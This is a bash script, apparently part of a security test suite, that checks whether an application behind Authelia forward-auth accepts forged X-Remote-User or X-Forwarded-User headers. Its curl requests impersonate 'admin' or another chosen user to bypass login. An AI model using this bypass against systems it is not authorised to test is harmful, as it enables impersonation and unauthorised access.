#!/usr/bin/env bash
# A6 — Header Injection (X-Remote-User)
# OWASP ASVS v4.2 § 2.8.1 / MITRE ATT&CK T1190
#
# Profile: 1B (Authelia Forward Auth)
#
# In a forward-auth setup, the reverse proxy calls the IdP to verify the user,
# then sets X-Remote-User / X-Forwarded-User before forwarding the request
# to the backend application.
#
# If the application trusts this header without verifying that it was set by
# the proxy (i.e., doesn't strip incoming headers), an attacker can inject
# any username and bypass authentication entirely.
#
# Usage:
#   bash A6_header_injection.sh <app_url> [target_user]

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/common.sh"

APP_URL="${1:?Usage: $0 <app_url> [target_user]}"
TARGET_USER="${2:-admin}"

echo "[A6] Header Injection — X-Remote-User bypass"
echo "     App: $APP_URL  |  Target user: $TARGET_USER"
echo

# ── Pre-flight: verify app is reachable ──────────────────────────────────────
PREFLIGHT=$(rcurl -sk -o /dev/null -w "%{http_code}" "${APP_URL%/}/" 2>/dev/null || echo "000")
if [[ "$PREFLIGHT" == "000" ]]; then
  echo "SKIPPED — App at $APP_URL is unreachable"
  exit 0
fi

RESULTS=()

# ── Test 1: Direct header injection without authentication ───────────────────
echo "  [Test 1] GET /dashboard with injected X-Remote-User: $TARGET_USER"
RESP_FILE="/tmp/a6_t1_$$.txt"
STATUS=$(rcurl -sk -o "$RESP_FILE" -w "%{http_code}" \
  -H "X-Remote-User: $TARGET_USER" \
  "${APP_URL%/}/dashboard" 2>/dev/null || echo "000")
BODY=$(head -c 500 "$RESP_FILE" 2>/dev/null || true)
rm -f "$RESP_FILE"

echo "           → HTTP $STATUS"
if [[ "$STATUS" == "200" ]]; then
  # Check if body actually shows the impersonated user
  if echo "$BODY" | grep -qi "admin\|${TARGET_USER}\|welcome\|logged"; then
    echo "           VULNERABLE — server accepted forged header, content reflects $TARGET_USER"
    RESULTS+=("T1:VULNERABLE")
  else
    echo "           LIKELY VULNERABLE — server returned 200 with injected header"
    RESULTS+=("T1:VULNERABLE")
  fi
elif [[ "$STATUS" == "401" || "$STATUS" == "403" ]]; then
  echo "           PROTECTED  — server rejected unauthenticated request (HTTP $STATUS)"
  RESULTS+=("T1:PROTECTED")
else
  echo "           PROTECTED  — server did not accept header injection (HTTP $STATUS)"
  RESULTS+=("T1:PROTECTED")
fi
echo

# ── Test 2: X-Forwarded-User variant ────────────────────────────────────────
echo "  [Test 2] GET /dashboard with X-Forwarded-User: $TARGET_USER"
RESP_FILE="/tmp/a6_t2_$$.txt"
STATUS2=$(rcurl -sk -o "$RESP_FILE" -w "%{http_code}" \
  -H "X-Forwarded-User: $TARGET_USER" \
  "${APP_URL%/}/dashboard" 2>/dev/null || echo "000")
BODY2=$(head -c 500 "$RESP_FILE" 2>/dev/null || true)
rm -f "$RESP_FILE"

echo "           → HTTP $STATUS2"
if [[ "$STATUS2" == "200" ]]; then
  echo "           VULNERABLE — server accepted X-Forwarded-User header"
  RESULTS+=("T2:VULNERABLE")
else
  echo "           PROTECTED  — server did not accept X-Forwarded-User (HTTP $STATUS2)"
  RESULTS+=("T2:PROTECTED")
fi
echo

# ── Test 3: Both headers together ───────────────────────────────────────────
echo "  [Test 3] GET /dashboard with both headers"
RESP_FILE="/tmp/a6_t3_$$.txt"
STATUS3=$(rcurl -sk -o "$RESP_FILE" -w "%{http_code}" \
  -H "X-Remote-User: $TARGET_USER" \
  -H "X-Forwarded-User: $TARGET_USER" \
  "${APP_URL%/}/dashboard" 2>/dev/null || echo "000")
rm -f "$RESP_FILE"

echo "           → HTTP $STATUS3"
if [[ "$STATUS3" == "200" ]]; then
  echo "           VULNERABLE — double-header bypass succeeded"
  RESULTS+=("T3:VULNERABLE")
else
  echo "           PROTECTED  — double-header not accepted (HTTP $STATUS3)"
  RESULTS+=("T3:PROTECTED")
fi
echo

# ── Summary ─────────────────────────────────────────────────────────────────
echo "─── Summary ───────────────────────────────────"
for r in "${RESULTS[@]}"; do echo "  $r"; done
echo

ANY_VULN=false
for r in "${RESULTS[@]}"; do [[ "$r" == *VULNERABLE* ]] && ANY_VULN=true; done

if $ANY_VULN; then
  echo "VULNERABLE — header injection allows authentication bypass"
else
  echo "PROTECTED  — application strips/ignores externally-set auth headers"
fi
